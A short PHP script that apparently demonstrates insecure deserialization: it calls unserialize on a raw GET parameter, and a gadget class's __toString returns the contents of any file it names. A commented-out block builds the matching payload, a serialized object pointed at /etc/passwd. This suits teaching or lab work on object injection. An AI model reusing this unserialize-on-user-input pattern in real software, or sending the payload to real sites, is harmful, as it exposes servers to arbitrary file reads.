<?php
//*
class Foo {
	public $file;

	public function __toString() {
		return file_get_contents($this->file);
	}
}
//*/

/*
class Foo {
	public $file;
}

$foo = new Foo();
$foo->file = '/etc/passwd';
echo urlencode(serialize($foo));
//*/

$userData = unserialize($_GET['data']);
echo $userData;
?>